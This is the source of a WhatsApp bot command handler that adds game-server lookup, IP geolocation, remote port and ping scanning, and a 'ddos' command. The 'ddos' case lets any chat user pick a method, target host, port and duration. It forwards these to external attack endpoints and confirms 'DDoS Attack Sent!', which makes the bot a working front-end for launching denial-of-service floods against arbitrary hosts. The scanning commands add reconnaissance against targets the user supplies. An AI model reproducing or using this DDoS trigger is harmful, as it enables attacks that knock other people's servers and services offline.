const { Function: Func, Logs, Scraper, InvCloud } = new(require('@neoxr/wb'))
const env = require('./config.json')
const cron = require('node-cron')
const cache = new(require('node-cache'))({
   stdTTL: env.cooldown
})
module.exports = async (client, ctx) => {
   const { store, m, body, prefix, plugins, commands, args, command, text, prefixes } = ctx
   // const context = m.message[m.mtype] || m.message.viewOnceMessageV2.message[m.mtype]
   // process.env['E_MSG'] = context.contextInfo ? Number(context.contextInfo.expiration) : 0
   try {
      // "InvCloud" reduces RAM usage and minimizes errors during rewrite (according to recommendations/suggestions from Baileys)
      require('./lib/system/schema')(m, env), InvCloud(store)
      const isOwner = [env.owner, client.decodeJid(client.user.id).split`@` [0], ...global.db.setting.owners].map(v => v + '@s.whatsapp.net').includes(m.sender)
      const isPrem = (global.db.users.some(v => v.jid == m.sender) && global.db.users.find(v => v.jid == m.sender).premium)
      const groupMetadata = m.isGroup ? await client.groupMetadata(m.chat) : {}
      const participants = m.isGroup ? groupMetadata.participants : [] || []
      const adminList = m.isGroup ? await client.groupAdmin(m.chat) : [] || []
      const isAdmin = m.isGroup ? adminList.includes(m.sender) : false
      const isBotAdmin = m.isGroup ? adminList.includes((client.user.id.split`:` [0]) + '@s.whatsapp.net') : false
      const blockList = typeof await (await client.fetchBlocklist()) != 'undefined' ? await (await client.fetchBlocklist()) : []
      const groupSet = global.db.groups.find(v => v.jid == m.chat),
         chats = global.db.chats.find(v => v.jid == m.chat),
         users = global.db.users.find(v => v.jid == m.sender),
         setting = global.db.setting
      Logs(client, m, false) /* 1 = print all message, 0 = print only cmd message */
      if (!setting.online) client.sendPresenceUpdate('unavailable', m.chat)
      if (setting.online) {
         client.sendPresenceUpdate('available', m.chat)
         client.readMessages([m.key])
      }
      if (m.isGroup && !isBotAdmin) {
         groupSet.localonly = false
      }
      if (!users || typeof users.limit === undefined) return global.db.users.push({
         jid: m.sender,
         banned: false,
         limit: env.limit,
         hit: 0,
         spam: 0
      })
      if (!setting.multiprefix) setting.noprefix = false
      if (setting.debug && !m.fromMe && isOwner) client.reply(m.chat, Func.jsonFormat(m), m)
      if (m.isGroup && !groupSet.stay && (new Date * 1) >= groupSet.expired && groupSet.expired != 0) {
         return client.reply(m.chat, Func.texted('italic', '🚩 Bot time has expired and will leave from this group, thank you.', null, {
            mentions: participants.map(v => v.id)
         })).then(async () => {
            groupSet.expired = 0
            await Func.delay(2000).then(() => client.groupLeave(m.chat))
         })
      }
      if (users && (new Date * 1) >= users.expired && users.expired != 0) {
         return client.reply(users.jid, Func.texted('italic', '🚩 Your premium package has expired, thank you for buying and using our service.')).then(async () => {
            users.premium = false
            users.expired = 0
            users.limit = env.limit
         })
      }     
      if (m.isGroup) groupSet.activity = new Date() * 1
      if (users) {
         users.name = m.pushName
         users.lastseen = new Date() * 1
      }
      if (chats) {
         chats.chat += 1
         chats.lastseen = new Date * 1
      }
      if (m.isGroup && !m.isBot && users && users.afk > -1) {
         client.reply(m.chat, `You are back online after being offline for : ${Func.texted('bold', Func.toTime(new Date - users.afk))}\n\n• ${Func.texted('bold', 'Reason')}: ${users.afkReason ? users.afkReason : '-'}`, m)
         users.afk = -1
         users.afkReason = ''
      }
      cron.schedule('00 00 * * *', () => {
         setting.lastReset = new Date * 1
         global.db.users.filter(v => v.limit < env.limit && !v.premium).map(v => v.limit = env.limit)
         Object.entries(global.db.statistic).map(([_, prop]) => prop.today = 0)
      }, {
         scheduled: true,
         timezone: process.env.TZ
      })
      switch (command) {
         // CASE CREATED BY PABLO
// JANGAN MENGUBAH KALAU TIDAK PAHAM
// KALAU API GA BERFUNGSI BERARTI DOMAIN GW EXPIRED :v

// SAMP CASE SYSTEM
// ===========================================================================================================================================================

case 'samp': {
    if (!text) return client.reply(m.chat, `Kirim perintah:\n${prefix+command} ip|port\n\nContoh penggunaan:\n${prefix+command} 127.0.0.1|7777`, m)
    if (!text.includes('|') && !text.split(" ").length === 3) return client.reply(m.chat, `Kirim perintah:\n${prefix+command} ip|port\n\nContoh penggunaan:\n${prefix+command} 127.0.0.1|7777`, m)
    
    const [ip, port] = text.includes('|') ? text.split("|") : text.split(" ").slice(-2);
    let sampApiUrl = `https://api.pablonetwork.my.id/API/samp?key=pablo&host=${ip}&port=${port}`
    
    try {
        let response = await fetch(sampApiUrl)
        let sampInfo = await response.json()

        // Mengambil nilai dari properti yang diinginkan
        let serverIP = sampInfo.response.serverip;
        let address = sampInfo.response.address;
        let gamemode = sampInfo.response.gamemode;
        let playerOnline = sampInfo.response.isPlayerOnline;
        let maxPlayers = sampInfo.response.maxplayers;
        let hostname = sampInfo.response.hostname;
        let language = sampInfo.response.language;
        let lagCompensation = sampInfo.response.rule.lagcomp;
        let mapName = sampInfo.response.rule.mapname;
        let version = sampInfo.response.rule.version;
        let weather = sampInfo.response.rule.weather;
        let webUrl = sampInfo.response.rule.weburl;
        let worldTime = sampInfo.response.rule.worldtime;

        // Menampilkan hasil ke pengguna dengan tata letak yang lebih rapi dan pemisahan menggunakan ":"
        let result = `
*Server Info:*
- Server IP: ${serverIP}
- Address: ${address}
- Gamemode: ${gamemode}
- Player Online: ${playerOnline}
- Max Players: ${maxPlayers}
- Hostname: ${hostname}
- Language: ${language}
- Lag Compensation: ${lagCompensation}
- Map Name: ${mapName}
- Version: ${version}
- Weather: ${weather}
- Web URL: ${webUrl}
- World Time: ${worldTime}`;

        // Menampilkan informasi pemain online (jika ada)
        client.reply(m.chat, result, m);
    } catch (error) {
        console.error(error);
        client.reply(m.chat, 'Error Cannot Connect To Server.', m);
    }
}
break;

case 'ipinfo': {
    if (!text) return client.reply(m.chat, `Kirim perintah:\n${prefix+command} [alamat IP]`, m)

    let ipAddress = text.trim();
    let ipApiUrl = `https://api.pablonetwork.my.id/API/samp/ipinfo?key=pablo&host=${ipAddress}`;

    try {
        let response = await fetch(ipApiUrl);
        let ipInfo = await response.json();

        // Menampilkan informasi alamat IP dari ip-api.com
        let result = `
*Informasi Alamat IP (${ipAddress}):*
- IP: ${ipInfo.query}
- Continent: ${ipInfo.continent}
- Continent Code: ${ipInfo.continentCode}
- Country: ${ipInfo.country}
- Country Code: ${ipInfo.countryCode}
- Region: ${ipInfo.region}
- Region Name: ${ipInfo.regionName}
- City: ${ipInfo.city}
- District: ${ipInfo.district}
- Zip: ${ipInfo.zip}
- Lat: ${ipInfo.lat}
- Lon: ${ipInfo.lon}
- TimeZone: ${ipInfo.timezone}
- Currency: ${ipInfo.currency}
- ISP: ${ipInfo.isp}
- Organization: ${ipInfo.org}
- AS: ${ipInfo.as}
- AS Name: ${ipInfo.asname}
- Reverse DNS: ${ipInfo.reverse}
- Mobile: ${ipInfo.mobile ? 'Yes' : 'No'}
- Proxy: ${ipInfo.proxy ? 'Yes' : 'No'}
- Hosting: ${ipInfo.hosting ? 'Yes' : 'No'}`;

        client.reply(m.chat, result, m);
    } catch (error) {
        console.error(error);
        client.reply(m.chat, 'Terjadi kesalahan saat mengambil informasi alamat IP dari ip-api.com.', m);
    }
}
break;

case 'portscan': {
    if (!text) return client.reply(m.chat, `Kirim perintah:\n${prefix+command} [alamat IP] [port]`, m)

    const [ip, port] = text.trim().split(" ");
    if (!ip || !port) return client.reply(m.chat, 'Mohon berikan alamat IP dan nomor port yang valid.', m);

    let portScanApiUrl = `https://api.pablonetwork.my.id/API/samp/portscan?key=pablo&host=${ip}&port=${port}`;

    try {
        let response = await fetch(portScanApiUrl);

        if (!response.ok) {
            throw new Error(`Terjadi kesalahan saat meminta API. Kode status: ${response.status}`);
        }

        let scanResult = await response.json();

        // Menampilkan hasil port scanning
        let result = `
*Hasil Port Scanning (${ip}:${port}):*
- Status: ${scanResult.response.status}`;

        if (scanResult.response.status === 'open') {
            result += `\n- Port terbuka: ${port}`;
        } else {
            result += '\n- Port tertutup.';
        }

        client.reply(m.chat, result, m);
    } catch (error) {
        console.error(error);
        client.reply(m.chat, 'Terjadi kesalahan saat melakukan port scanning.', m);
    }
}
break;

case 'pingscan': {
    if (!text) return client.reply(m.chat, `Kirim perintah:\n${prefix+command} [alamat IP] [port]`, m)

    const [ip, port] = text.trim().split(" ");
    if (!ip || !port) return client.reply(m.chat, 'Mohon berikan alamat IP dan nomor port yang valid.', m);

    let pingScanApiUrl = `https://api.pablonetwork.my.id/API/samp/ping?key=pablo&host=${ip}&port=${port}`;

    try {
        let response = await fetch(pingScanApiUrl);

        if (!response.ok) {
            throw new Error(`Terjadi kesalahan saat meminta API. Kode status: ${response.status}`);
        }

        let pingResult = await response.json();

        if (pingResult.response && pingResult.response.ping !== undefined) {
            // Menampilkan hasil ping scanning
            let result = `
*Result Ping Scan (${ip}:${port}):*
- Ping: ${pingResult.response.ping} ms`;

            client.reply(m.chat, result, m);
        } else {
            client.reply(m.chat, 'Tidak dapat mendapatkan informasi waktu ping dari respons API.', m);
        }
    } catch (error) {
        console.error(error);
        client.reply(m.chat, 'Terjadi kesalahan saat melakukan ping scan. Mohon periksa kembali alamat IP dan port yang diberikan.', m);
    }
}
break;

case 'ddos': {
    if (!text) return client.reply(m.chat, `Kirim perintah:\n${prefix+command} [methods] [host] [port] [time]`, m)

    const [jenisAtt, host, port, time] = text.trim().split(" ");
    if (!jenisAtt || !host || !port || !time) return client.reply(m.chat, 'Mohon berikan semua parameter yang diperlukan.', m);

    let apiUrl = '';
    let attType = '';

    if (jenisAtt.toLowerCase() === 'tls') {
        apiUrl = `https://api-ddos.cyclic.app/?host=${host}&time=${time}&method=TLS`;
        attType = 'DDoS Attack';
    } else if (jenisAtt.toLowerCase() === 'samp') {
        apiUrl = `https://flask-production-1db9.up.railway.app/?host=${host}&port=${port}&time=${time}`;
        attType = 'DDoS Attack';
    } else {
        return client.reply(m.chat, 'Methods tidak valid. Harap pilih "TLS" atau "SAMP".', m);
    }

    try {
        let response = await fetch(apiUrl);

        if (!response.ok) {
            throw new Error(`Terjadi kesalahan saat meminta API. Kode status: ${response.status}`);
        }

        // Menampilkan hasil serangan
        let resultMessage = `
        *${attType} Sent!*
        - Methods: ${jenisAtt}
        - Host: ${host}
        - Port: ${port}
        - Time: ${time}
        - Sent By PabloNetwork`;

        client.reply(m.chat, resultMessage, m);
    } catch (error) {
        console.error(error);
        client.reply(m.chat, `Terjadi kesalahan saat melakukan ${attType}. Mohon periksa kembali parameter yang diberikan.`, m);
    }
}
break;

case 'helptrack': {
    let helpMessage = `
    ∘₊✧──────『𝗔𝗹𝗹 𝗠𝗲𝗻𝘂』──────

┌  ◦ *𝗜𝗻𝗳𝗼 𝗠𝗲𝗻𝘂*
│  ◦ samp
│  ◦ fivem (OnGoing)
│  ◦ mc (OnGoing)
│  ◦ ddos
│  ◦ ipinfo
│  ◦ pingscan
│  ◦ portscan
│  ◦ wl (OnGoing)
│  ◦ server
│  ◦ player
│  ◦ status
│  ◦ ip
┗─────────────────⬣
    `;

    client.reply(m.chat, helpMessage, m);
}
break;

case 'fivem': {
    let ComingSoonMessage= `
   Sorry This Feature Is ComingSoon
    `;

    client.reply(m.chat, ComingSoonMessage, m);
}
break;

case 'mc': {
    let ComingSoonMessage= `
   Sorry This Feature Is ComingSoon
    `;

    client.reply(m.chat, ComingSoonMessage, m);
}
break;

case 'wl': {
    let ComingSoonMessage= `
   Sorry This Feature Is ComingSoon
    `;

    client.reply(m.chat, ComingSoonMessage, m);
}
break;

case 'server': {
    let sampApiUrl = `https://api.pablonetwork.my.id/API/samp?key=pablo&host=aerialsdm.pablonetwork.my.id&port=7777`
    
    try {
        let response = await fetch(sampApiUrl)
        let sampInfo = await response.json()

        // Mengambil nilai dari properti yang diinginkan
        let serverIP = sampInfo.response.serverip;
        let address = sampInfo.response.address;
        let gamemode = sampInfo.response.gamemode;
        let playerOnline = sampInfo.response.isPlayerOnline;
        let maxPlayers = sampInfo.response.maxplayers;
        let hostname = sampInfo.response.hostname;
        let language = sampInfo.response.language;
        let lagCompensation = sampInfo.response.rule.lagcomp;
        let mapName = sampInfo.response.rule.mapname;
        let version = sampInfo.response.rule.version;
        let weather = sampInfo.response.rule.weather;
        let webUrl = sampInfo.response.rule.weburl;
        let worldTime = sampInfo.response.rule.worldtime;

        // Menampilkan hasil ke pengguna dengan tata letak yang lebih rapi dan pemisahan menggunakan ":"
        let result = `
*Aerials DM Server Info:*
- Server IP: ${serverIP}
- Address: ${address}
- Gamemode: ${gamemode}
- Player Online: ${playerOnline}
- Max Players: ${maxPlayers}
- Hostname: ${hostname}
- Language: ${language}
- Lag Compensation: ${lagCompensation}
- Map Name: ${mapName}
- Version: ${version}
- Weather: ${weather}
- Web URL: ${webUrl}
- World Time: ${worldTime}`;

        // Menampilkan informasi pemain online (jika ada)
        client.reply(m.chat, result, m);
    } catch (error) {
        console.error(error);
        client.reply(m.chat, 'Now Server Is Offline 🔴.', m);
    }
}
break;

case 'player': {
    let sampApiUrl = `https://api.pablonetwork.my.id/API/samp?key=pablo&host=aerialsdm.pablonetwork.my.id&port=7777`
    
    try {
        let response = await fetch(sampApiUrl)
        let sampInfo = await response.json()

        // Mengambil nilai dari properti yang diinginkan
        let serverIP = sampInfo.response.serverip;
        let address = sampInfo.response.address;
        let gamemode = sampInfo.response.gamemode;
        let playerOnline = sampInfo.response.isPlayerOnline;
        let maxPlayers = sampInfo.response.maxplayers;
        let hostname = sampInfo.response.hostname;
        let language = sampInfo.response.language;
        let lagCompensation = sampInfo.response.rule.lagcomp;
        let mapName = sampInfo.response.rule.mapname;
        let version = sampInfo.response.rule.version;
        let weather = sampInfo.response.rule.weather;
        let webUrl = sampInfo.response.rule.weburl;
        let worldTime = sampInfo.response.rule.worldtime;

        // Menampilkan hasil ke pengguna dengan tata letak yang lebih rapi dan pemisahan menggunakan ":"
        let result = `
*Aerials DM Players Info:*
- Server IP: ${serverIP}
- Hostname: ${hostname}
- Player Online: ${playerOnline}
- Max Players: ${maxPlayers}`;

        // Menampilkan informasi pemain online (jika ada)
        client.reply(m.chat, result, m);
    } catch (error) {
        console.error(error);
        client.reply(m.chat, 'Now Server Is Offline 🔴.', m);
    }
}
break;

case 'status': {
    let sampApiUrl = `https://api.pablonetwork.my.id/API/samp?key=pablo&host=aerialsdm.pablonetwork.my.id&port=7777`
    
    try {
        let response = await fetch(sampApiUrl)
        let sampInfo = await response.json()

        // Mengambil nilai dari properti yang diinginkan
        let serverIP = sampInfo.response.serverip;
        let address = sampInfo.response.address;
        let gamemode = sampInfo.response.gamemode;
        let playerOnline = sampInfo.response.isPlayerOnline;
        let maxPlayers = sampInfo.response.maxplayers;
        let hostname = sampInfo.response.hostname;
        let language = sampInfo.response.language;
        let lagCompensation = sampInfo.response.rule.lagcomp;
        let mapName = sampInfo.response.rule.mapname;
        let version = sampInfo.response.rule.version;
        let weather = sampInfo.response.rule.weather;
        let webUrl = sampInfo.response.rule.weburl;
        let worldTime = sampInfo.response.rule.worldtime;

        // Menampilkan hasil ke pengguna dengan tata letak yang lebih rapi dan pemisahan menggunakan ":"
        let result = `
*Now Server Is Online 🟢.*`;

        // Menampilkan informasi pemain online (jika ada)
        client.reply(m.chat, result, m);
    } catch (error) {
        console.error(error);
        client.reply(m.chat, 'Now Server Is Offline 🔴.', m);
    }
}
break;

case 'shutdown': {
    if (m.sender !== '62857552519341') return client.reply(m.chat, 'Maaf, hanya owner yang dapat menggunakan fitur ini.', m);
    client.reply(m.chat, 'Otsukaresama deshita 🖐', m);
    await sleep(3000);
    process.exit();
}
break;

case 'ip': {
    let IpMessage= `
aerialsdm.pablonetwork.my.id:6100
    `;

    client.reply(m.chat, IpMessage, m);
}
break;
// BATAS SUCI
// ===========================================================================================================================================================

      }
      if (m.isGroup && !m.fromMe) {
         let now = new Date() * 1
         if (!groupSet.member[m.sender]) {
            groupSet.member[m.sender] = {
               lastseen: now,
               warning: 0
            }
         } else {
            groupSet.member[m.sender].lastseen = now
         }
      }
      const corePrefix = setting.prefix.concat([setting.onlyprefix])
      const core = {
         prefix: body ? Func.isEmojiPrefix(body) ? Func.getEmoji(body)[0] : body.charAt(0) : '',
         command: body ? corePrefix.some(v => body.startsWith(v)) ? body.replace(corePrefix.find(v => body.startsWith(v)), '').split` `[0] : body.split` `[0] : '',
         corePrefix
      }
      if (body && !setting.noprefix && !core.corePrefix.includes(core.prefix) && commands.includes(core.command) && !env.evaluate_chars.includes(core.command)) return client.reply(m.chat, `🚩 *Prefix needed!*, this bot uses prefix : *[ ${setting.multiprefix ? setting.prefix.join(', ') : setting.onlyprefix} ]*\n\n➠ ${setting.multiprefix ? setting.prefix[0] : setting.onlyprefix}${core.command} ${text || ''}`, m)
      if (body && core.prefix != setting.onlyprefix && commands.includes(core.command) && !setting.multiprefix && !env.evaluate_chars.includes(core.command)) return client.reply(m.chat, `🚩 *Incorrect prefix!*, this bot uses prefix : *[ ${setting.onlyprefix} ]*\n\n➠ ${setting.onlyprefix + core.command} ${text || ''}`, m)
      const matcher = Func.matcher(command, commands).filter(v => v.accuracy >= 60)
      if (prefix && !commands.includes(command) && matcher.length > 0 && !setting.self) {
         if (!m.isGroup || (m.isGroup && !groupSet.mute)) return client.reply(m.chat, `🚩 Command you are using is wrong, try the following recommendations :\n\n${matcher.map(v => '➠ *' + (prefix ? prefix : '') + v.string + '* (' + v.accuracy + '%)').join('\n')}`, m)
      }
      if (body && prefix && commands.includes(command) || body && !prefix && commands.includes(command) && setting.noprefix || body && !prefix && commands.includes(command) && env.evaluate_chars.includes(command)) {
         if (setting.error.includes(command)) return client.reply(m.chat, Func.texted('bold', `🚩 Command _${(prefix ? prefix : '') + command}_ disabled.`), m)
         if (!m.isGroup && env.blocks.some(no => m.sender.startsWith(no))) return client.updateBlockStatus(m.sender, 'block')
         if (cache.has(m.chat) && cache.get(m.chat) === 'on_hold' && !m.isBot) return
         cache.set(m.chat, 'on_hold')
         if (commands.includes(command)) {
            users.hit += 1
            users.usebot = new Date() * 1
            Func.hitstat(command, m.sender)
         }
         const is_commands = Object.fromEntries(Object.entries(plugins).filter(([name, prop]) => prop.run.usage))
         for (let name in is_commands) {
            const cmd = is_commands[name].run
            const turn = cmd.usage instanceof Array ? cmd.usage.includes(command) : cmd.usage instanceof String ? cmd.usage == command : false
            const turn_hidden = cmd.hidden instanceof Array ? cmd.hidden.includes(command) : cmd.hidden instanceof String ? cmd.hidden == command : false
            if (!turn && !turn_hidden) continue
            if (m.isBot || m.chat.endsWith('broadcast') || /edit/.test(m.mtype)) continue
            if (setting.self && !isOwner && !m.fromMe) continue
            if (!m.isGroup && !['owner'].includes(name) && chats && !isPrem && !users.banned && new Date() * 1 - chats.lastchat < env.timeout) continue
            if (!m.isGroup && !['owner', 'menfess', 'scan', 'verify', 'payment', 'premium'].includes(name) && chats && !isPrem && !users.banned && setting.groupmode) {
               client.sendMessageModify(m.chat, `⚠️ Using bot in private chat only for premium user, want to upgrade to premium plan ? send *${prefixes[0]}premium* to see benefit and prices.`, m, {
                  largeThumb: true,
                  thumbnail: 'https://telegra.ph/file/0b32e0a0bb3b81fef9838.jpg',
                  url: setting.link
               }).then(() => chats.lastchat = new Date() * 1)
               continue
            }
            if (!['me', 'owner', 'exec'].includes(name) && users && (users.banned || new Date - users.banTemp < env.timeout)) continue
            if (m.isGroup && !['activation', 'groupinfo'].includes(name) && groupSet.mute) continue
            if (cmd.cache && cmd.location) {
               let file = require.resolve(cmd.location)
               Func.reload(file)
            }
            if (cmd.owner && !isOwner) {
               client.reply(m.chat, global.status.owner, m)
               continue
            }
            if (cmd.restrict && !isPrem && !isOwner && text && new RegExp('\\b' + setting.toxic.join('\\b|\\b') + '\\b').test(text.toLowerCase())) {
               client.reply(m.chat, `⚠️ You violated the *Terms & Conditions* of using bots by using blacklisted keywords, as a penalty for your violation being blocked and banned.`, m).then(() => {
                  users.banned = true
                  client.updateBlockStatus(m.sender, 'block')
               })
               continue
            }
            if (cmd.premium && !isPrem) {
               client.reply(m.chat, global.status.premium, m)
               continue
            }
            if (cmd.limit && users.limit < 1) {
               client.reply(m.chat, `⚠️ You reached the limit and will be reset at 00.00\n\nTo get more limits upgrade to premium plans.`, m).then(() => users.premium = false)
               continue
            }
            if (cmd.limit && users.limit > 0) {
               const limit = cmd.limit.constructor.name == 'Boolean' ? 1 : cmd.limit
               if (users.limit >= limit) {
                  users.limit -= limit
               } else {
                  client.reply(m.chat, Func.texted('bold', `⚠️ Your limit is not enough to use this feature.`), m)
                  continue
               }
            }
            if (cmd.group && !m.isGroup) {
               client.reply(m.chat, global.status.group, m)
               continue
            } else if (cmd.botAdmin && !isBotAdmin) {
               client.reply(m.chat, global.status.botAdmin, m)
               continue
            } else if (cmd.admin && !isAdmin) {
               client.reply(m.chat, global.status.admin, m)
               continue
            }
            if (cmd.private && m.isGroup) {
               client.reply(m.chat, global.status.private, m)
               continue
            }
            cmd.async(m, { client, args, text, isPrefix: prefix, prefixes, command, groupMetadata, participants, users, chats, groupSet, setting, isOwner, isAdmin, isBotAdmin, plugins, blockList, env, ctx, store, Func, Scraper })
            break
         }
      } else {
         const is_events = Object.fromEntries(Object.entries(plugins).filter(([name, prop]) => !prop.run.usage))
         if (cache.has(m.chat) && cache.get(m.chat) === 'on_hold' && !m.isBot) return
         cache.set(m.sender, 'on_hold')
         for (let name in is_events) {
            let event = is_events[name].run
            if (m.fromMe || m.chat.endsWith('broadcast') || /pollUpdate/.test(m.mtype)) continue
            if (!m.isGroup && env.blocks.some(no => m.sender.startsWith(no))) return client.updateBlockStatus(m.sender, 'block')
            if (setting.self && !['menfess_ev', 'anti_link', 'anti_tagall', 'anti_virtex', 'filter'].includes(event.pluginName) && !isOwner && !m.fromMe) continue
            if (!['anti_link', 'anti_tagall', 'anti_virtex', 'filter'].includes(name) && users && (users.banned || new Date - users.banTemp < env.timeout)) continue
            if (!['anti_link', 'anti_tagall', 'anti_virtex', 'filter'].includes(name) && groupSet && groupSet.mute) continue
            if (!m.isGroup && !['menfess_ev', 'chatbot', 'auto_download'].includes(name) && chats && !isPrem && !users.banned && new Date() * 1 - chats.lastchat < env.timeout) continue
            if (!m.isGroup && setting.groupmode && !['system_ev', 'menfess_ev', 'chatbot', 'auto_download'].includes(name) && !isPrem) return client.sendMessageModify(m.chat, `⚠️ Using bot in private chat only for premium user, want to upgrade to premium plan ? send *${prefixes[0]}premium* to see benefit and prices.`, m, {
               largeThumb: true,
               thumbnail: await Func.fetchBuffer('https://telegra.ph/file/0b32e0a0bb3b81fef9838.jpg'),
               url: setting.link
            }).then(() => chats.lastchat = new Date() * 1)
            if (event.cache && event.location) {
               let file = require.resolve(event.location)
               Func.reload(file)
            }
            if (event.error) continue
            if (event.owner && !isOwner) continue
            if (event.group && !m.isGroup) continue
            if (event.limit && !event.game && users.limit < 1 && body && Func.generateLink(body) && Func.generateLink(body).some(v => Func.socmed(v))) return client.reply(m.chat, `⚠️ You reached the limit and will be reset at 00.00\n\nTo get more limits upgrade to premium plan.`, m).then(() => {
               users.premium = false
               users.expired = 0
            })
            if (event.botAdmin && !isBotAdmin) continue
            if (event.admin && !isAdmin) continue
            if (event.private && m.isGroup) continue
            if (event.download && (!setting.autodownload || (body && env.evaluate_chars.some(v => body.startsWith(v))))) continue
            event.async(m, { client, body, prefixes, groupMetadata, participants, users, chats, groupSet, setting, isOwner, isAdmin, isBotAdmin, plugins, blockList, env, ctx, store, Func, Scraper })
         }
      }
   } catch (e) {
      if (/(undefined|overlimit|timed|timeout|users|item|time)/ig.test(e.message)) return
      console.log(e)
      if (!m.fromMe) return m.reply(Func.jsonFormat(new Error('neoxr-bot encountered an error :' + e)))
   }
   Func.reload(require.resolve(__filename))
}
